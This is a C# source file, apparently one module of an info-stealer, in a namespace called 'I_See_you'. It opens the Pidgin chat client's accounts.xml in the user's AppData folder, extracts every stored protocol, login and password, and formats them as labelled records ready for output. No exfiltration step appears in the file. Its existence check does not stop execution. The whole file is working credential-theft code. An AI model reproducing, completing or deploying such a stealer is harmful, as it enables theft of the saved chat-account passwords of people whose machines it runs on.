using System;
using System.Collections.Generic;
using System.IO;
using System.Xml;

namespace I_See_you
{
    class Pidgin
    {
        public static List<PassDataPidgin> Initialise()
        {
            List<PassDataPidgin> pidgin = new List<PassDataPidgin>();
            string result = "";
            try
            {
                string src = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                         "\\.purple\\accounts.xml";
                if (!File.Exists(src))
                {
                    result = null;
                }

                XmlDocument doc = new XmlDocument();
                doc.Load(src);
                foreach (XmlNode node in doc.DocumentElement)
                {
                    string protocolName = node["protocol"] != null ? node["protocol"].InnerText : "";
                    string login = node["name"] != null ? node["name"].InnerText : "";
                    string password = node["password"] != null ? node["password"].InnerText : "";
                    pidgin.Add(new PassDataPidgin(protocolName, login, password));
                }
            }
            catch (Exception ex)
            {
               Console.WriteLine(ex);
            }
            return pidgin;
        }
    }
    class PassDataPidgin
    {
        public string Protocolname { get; private set; }
        public string Login { get; private set; }
        public string Password { get; private set; }
        public PassDataPidgin(string protocol, string login, string password)
        {
            Protocolname = protocol;
            Login = login;
            Password = password;
        }

        public override string ToString()
        {
            return
                string.Format(
                    "Program : {0}\r\nProtocol : {1}\r\nLogin : {2}\r\nPassword : {3}\r\n——————————————————————————————————",
                    new object[]
                    {
                        "Pidgin",
                        Protocolname,
                        Login,
                        Password,
                    });
        }
    }
}
